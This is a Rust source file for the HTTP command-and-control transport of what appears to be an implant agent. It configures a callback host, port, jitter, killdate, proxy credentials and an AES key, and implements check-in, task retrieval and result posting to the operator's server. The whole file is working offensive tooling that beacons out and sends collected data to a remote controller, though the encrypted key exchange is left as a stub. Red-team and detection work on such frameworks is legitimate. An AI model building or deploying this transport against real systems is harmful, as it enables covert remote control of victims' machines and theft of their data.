use core::sync::atomic::Ordering;
use crate::Result;
use crate::sys::network::http_request;
use crate::DEBUG;
use rand::Rng;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use super::C2Transport;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpProfile {
    pub aes_psk: Option<String>,
    pub callback_host: String,
    pub callback_interval: u64,
    pub callback_jitter: u64,
    pub callback_port: u16,
    pub encrypted_exchange_check: bool,
    pub get_uri: String,
    pub headers: HashMap<String, String>,
    pub killdate: String,
    pub post_uri: String,
    pub proxy_host: String,
    pub proxy_pass: String,
    pub proxy_port: String,
    pub proxy_user: String,
    pub query_path_name: String,
}


/// Percent-encode bytes that aren't URL-safe.
fn url_encode(s: &str) -> String {
    s.bytes()
        .map(|b| match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                format!("{}", b as char)
            }
            _ => format!("%{:02X}", b),
        })
        .collect()
}

impl HttpProfile {
    fn build_get_url(&self, packed: &str) -> String {
        format!(
            "{}:{}/{}?{}={}",
            self.callback_host,
            self.callback_port,
            self.get_uri,
            self.query_path_name,
            url_encode(packed)
        )
    }

    fn proxy_url(&self) -> Option<String> {
        if self.proxy_host.is_empty() {
            return None;
        }
        let mut url = String::from("http://");
        if !self.proxy_user.is_empty() {
            url.push_str(&self.proxy_user);
            if !self.proxy_pass.is_empty() {
                url.push(':');
                url.push_str(&self.proxy_pass);
            }
            url.push('@');
        }
        url.push_str(&self.proxy_host);
        if !self.proxy_port.is_empty() {
            url.push(':');
            url.push_str(&self.proxy_port);
        }
        Some(url)
    }
}

impl C2Transport for HttpProfile {
    fn get_aes_psk(&self) -> Option<String> {
        self.aes_psk.clone()
    }

    fn set_aes_psk(&mut self, _key: &str) -> Option<String> {
        let old_aes_psk = self.aes_psk.clone();
        self.aes_psk = Some(_key.to_string());
        old_aes_psk
    }

    fn random_iv(&self) -> Result<[u8; 16]> {
        let mut iv = [0u8; 16];
        rand::thread_rng().fill(&mut iv);
        Ok(iv)
    }

    // TODO(2026-07): implement Noise_KK EKE handshake (scripts/init.rs has the test code)
    fn encrypted_exchange_check(&self) -> bool {
        false
    }

    fn checkin(&self, packed: &str) -> Result<String> {
        let url = self.build_get_url(packed);
        if DEBUG.load(Ordering::Relaxed) {
            println!("[C2] checkin GET {}", &url);
        }
        let resp = http_request(&url, "GET", Some(&self.headers), self.proxy_url().as_deref(), None).map_err(|e| {
            eprintln!("[C2] checkin error: {e}");
            e
        })?;
        if DEBUG.load(Ordering::Relaxed) {
            println!("[C2] checkin resp: {resp}");
        }
        Ok(resp)
    }

    fn get_tasking(&self, packed: &str) -> Result<String> {
        let url = self.build_get_url(packed);
        if DEBUG.load(Ordering::Relaxed) {
            println!("[C2] get_tasking GET {}", &url);
        }
        http_request(&url, "GET", Some(&self.headers), self.proxy_url().as_deref(), None)
    }

    fn post_response(&self, packed: &str) -> Result<String> {
        let url = format!(
            "{}:{}/{}",
            self.callback_host, self.callback_port, self.post_uri
        );
        if DEBUG.load(Ordering::Relaxed) {
            println!("[C2] post_response POST {}", &url);
        }
        http_request(&url, "POST", Some(&self.headers), self.proxy_url().as_deref(), Some(packed))
    }
}
